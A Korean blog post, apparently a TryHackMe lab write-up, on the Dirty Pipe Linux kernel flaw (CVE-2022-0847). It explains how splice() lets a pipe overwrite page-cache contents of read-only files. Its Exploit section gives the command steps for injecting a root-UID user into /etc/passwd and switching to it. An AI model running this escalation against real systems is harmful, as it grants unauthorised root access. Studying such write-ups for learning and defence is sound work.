---
layout: post
title: 'Dirty Pipe: CVE-2022-0847'
date: 2025-07-05 14:14 +0900
description:
category: security
tags: [exploit, linux, cve]
excerpt: "[THM] Dirty Pipe 정리"
---

## Introduction

Max Kellerman 이 공개한 Linux Kernel 취약점, 통칭 Dirty Pipe( 더 이전의 커널 버전에서의 Dirty Cow 취약점에서 따온 이름). 이는 공격자가 임의로 OS 상에 파일을 쓸 수 있게 해줌.

커널 레벨에서 임의의 파일을 쓸 수 있다는거는 당연히도 손쉽게 privilege escalation 을 할 수 있게 해준다.

이 취약점은 Linux kernel 5.16.11, 5.15.25, 5.10.102 에서 제거됐다.

## Theory

<https://dirtypipe.cm4all.com/>

익명 파이프 ( anonymous pipes ) :
쉘 스크립트에서 일반적으로 파이프 (|) 로 프로세스 간에 데이터 전달하는 방식. pipe 는 읽기용 endpoint 와 쓰기용 endpoint 로 구성된다. 이렇게 두 파이프의 endpoint 를 각 프로세스가 나눠가지고 소통하는 형태다.

리눅스 커널은 splice() 라는 시스템 콜을 제공하는데, 이게 pipe 에 넣는 과정을 빠르게 하기 위한 일종의 최적화된 단축기능. 이 최적화는 파일 내용을 실제로 복사하는게 아니고, 그 내용을 저장한 페이지(memory page )에 대한 참조만 옮겨서 수행.

그러니 우리가 page 를 파이프에 splice() 하고 그 파이프에 임의의 데이터를 쓰면, 그 페이지의 내용을 덮어쓸 수 있다. 그 page 는 어떤 file 의 일부분일 것이고, read only 로 열었다 하더라도 덮어써진다는 것.

중요한건 이 조작이 page cache 에 대한 조작이므로 kernel 이 page cache 를 reclaim 하지 않는 이상 실제로 디스크에 써지지는 않는다. 그러므로, 이 조작을 가한 뒤 사용하는거야 dirty page 인 page cache 의 것을 읽어와서 사용할 수 있지만 리부팅을 하고 다시 확인하면 disk 의 것을 읽기 때문에 영구적인 반영이 되어있지 않은 셈이다.

## Exploit

```bash
grep -b "games" /etc/passwd
```

으로 해당 파일의 몇번째 byte offset 에 쓸 지 확인

```bash
openssl passwd -6 --salt THM "PASSWORD"
```

hash 생성

```bash
./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash
> '
```

exploit 주입

```bash
su USERNAME
```

PASSWORD 입력

## Variation
